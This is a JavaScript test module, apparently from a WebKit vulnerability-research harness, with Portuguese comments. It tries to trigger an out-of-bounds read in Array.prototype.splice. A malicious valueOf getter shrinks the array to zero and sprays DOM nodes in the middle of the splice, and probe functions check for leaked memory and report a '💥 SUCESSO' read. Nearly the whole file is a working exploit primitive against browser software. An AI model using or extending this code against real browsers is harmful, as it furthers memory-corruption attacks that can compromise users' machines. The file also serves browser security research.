import { Groomer } from '../mod_groomer.js';

export default {
    id:       'ARRAY_BUTTERFLY_SPLICE_OOB',
    category: 'CoreJS',
    risk:     'CRITICAL',
    description:
        'Mutação do JSArray Butterfly durante a execução do C++ Array.prototype.splice. ' +
        'O tamanho do array é reduzido a zero dentro de um getter maligno (valueOf) ' +
        'enquanto o motor C++ está a mover os elementos. Resulta em Out-Of-Bounds (OOB).',

    setup: function() {
        this.results = {};
        
        // Criamos o array vulnerável (Array de Doubles)
        this.vulnArray = [];
        for (let i = 0; i < 20; i++) {
            this.vulnArray.push(1.111111 + i);
        }

        const self = this;
        this.evilObject = {
            valueOf: function() {
                // FIX: Agora aponta para o array correto e não para o próprio evilObject
                self.vulnArray.length = 0;
                
                let trash = Groomer.sprayDOM('div', 1000);
                return 9.999999;
            }
        };
    },

    trigger: function() {
        try {
            // O GATILHO: Substituir o índice 5 pelo nosso objeto maligno.
            // O WebKit vai ler o '.valueOf()' do objeto para o converter, disparando a nossa armadilha!
            this.vulnArray.splice(5, 1, this.evilObject);
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        // Probe 0: Qual é o tamanho final do array para o motor C++? (Deveria ser 0 ou 20)
        s => s.vulnArray.length,
        
        // Probe 1: Tenta ler o índice 10. Se length for 0, isto devia ser 'undefined'.
        // Se retornar um número, o C++ está a ler memória OOB!
        s => typeof s.vulnArray[10],
        
        // Probe 2: O Leitor de OOB
        s => {
            let val = s.vulnArray[10];
            if (typeof val === 'number' && !isNaN(val)) {
                return `💥 SUCESSO! OOB Read (Lixo da RAM): ${val}`;
            }
            return 'Protegido / Array Vazio';
        }
    ],

    cleanup: function() {
        this.vulnArray = null;
        this.evilObject = null;
    }
};
